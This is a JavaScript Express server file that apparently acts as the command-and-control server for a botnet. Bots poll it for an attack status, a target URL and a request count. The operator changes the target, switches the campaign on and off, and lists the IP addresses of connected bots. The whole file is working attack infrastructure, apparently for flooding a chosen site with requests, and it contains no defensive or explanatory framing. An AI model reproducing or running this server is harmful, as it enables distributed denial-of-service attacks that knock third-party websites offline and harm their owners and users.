import express from "express";
import cors from "cors";
import bodyParser from "body-parser";

const PORT = 3000;
const app = express();

app.use(cors());
app.use(bodyParser.json());

app.set("trust proxy", true);

let status = false;
let target = "";
let activeBots = new Map();
let botsResponses = [];

app.post("/requestInfo", (req, res) => {
  console.log(req.body);
  res.status(200).send(req.body);
  return;
});

app.post("/setServerStatus", (req, res) => {
  status = req.body.status;
  res.status(200).end(`Set server status to ${status ? "active" : "disabled"}`);
});

app.get("/getTargetInfo", (req, res) => {
  activeBots.set(req.ip, new Date());
  res.status(200).send({
    status: status,
    targetUrl: target,
    requestNum: 100,
  });
  console.log(activeBots);
});

app.get("/getServerStatus", (req, res) => {
  res.status(200).send({
    status: status,
  });
});

app.post("/sendBotStat", (req, res) => {
  console.log(req.body);
  res.status(200).send(req.body);
});

app.post("/changeTarget", (req, res) => {
  target = req.body.target;
  res.status(200).end(`Set new target to ${target}`);
});

app.get("/getConnectedBots", (req, res) => {
  res.status(200).send(Array.from(activeBots.keys()));
  console.log(activeBots);
});

app.listen(PORT, () => {
  console.log(`Example app listening on port ${PORT}`);
});
